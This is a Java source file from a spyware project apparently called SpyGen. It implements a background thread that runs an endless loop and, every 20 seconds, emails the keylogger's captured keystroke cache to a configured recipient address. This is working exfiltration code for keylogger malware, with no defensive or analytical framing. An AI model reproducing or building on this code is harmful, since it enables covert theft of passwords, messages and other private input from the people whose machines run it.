package com.houarizegai.spygen.mail;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import com.houarizegai.spygen.keylogger.Keylogger;

public class SenderService implements Runnable {

    private Thread service;

    public SenderService() {
        service = new Thread(this, "Manage service");
        service.start();
    }

    private void sendMail(String content) {
        new SendMails().setSenderMail(Settings.senderMail)
                .setSenderPassword(Settings.senderPassword)
                .setMessageRecipients(Settings.receiverMail)
                .setMessageType("text/html")
                .setMessageSubject("SpyGen results")
                .setMessageContent(content)
                .send();
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while(true) {
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            if(elapsed > 20_000) { // Send email every time period (you can augment the time as you like!)
                try {
                    sendMail(Utils.rawPrint(Keylogger.keyboard.getKeyCache()));
                    Keylogger.keyboard.onSend();
                } catch(Throwable e) {
                    e.printStackTrace();
                    Keylogger.keyboard.onFail();
                }

                start = System.nanoTime(); // Reset the timer
            }
        }
    }
}
